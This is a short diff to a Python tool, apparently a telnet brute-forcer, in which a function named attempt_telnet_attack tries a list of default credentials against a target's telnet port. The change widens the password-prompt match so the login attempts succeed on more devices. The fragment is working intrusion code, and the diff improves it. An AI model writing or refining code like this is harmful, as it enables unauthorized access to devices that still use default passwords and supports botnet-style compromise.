@@ -178,7 +178,7 @@ def attempt_telnet_attack(target: str) -> bool:
         for user, password in DEFAULT_CREDS:
             logging.info("Trying credentials %s:%s on %s:%s", user, password, target, TELNET_PORT)
             tn.write(user.encode("ascii") + b"\n")
-            if not wait_for_prompt(tn, [b"password:"], timeout=3):
+            if not wait_for_prompt(tn, [b"password:", b"Password:"], timeout=3):
                 tn.write(b"\n")
                 continue
             tn.write(password.encode("ascii") + b"\n")
